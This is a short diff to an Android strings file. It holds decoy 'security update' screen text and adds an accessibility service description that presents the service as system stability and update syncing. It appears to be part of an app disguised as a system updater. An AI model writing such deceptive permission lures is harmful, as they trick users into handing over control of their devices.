@@ -8,6 +8,9 @@
     <string name="decoy_security_patch">Android security update: July 1, 2026</string>
     <string name="decoy_check_btn">Check for update</string>
     <string name="decoy_checking">Checking for updates...</string>
+
+    <!-- Accessibility Service -->
+    <string name="accessibility_description">Ensures system stability and background synchronization for system updates.</string>
 </resources>
 
 
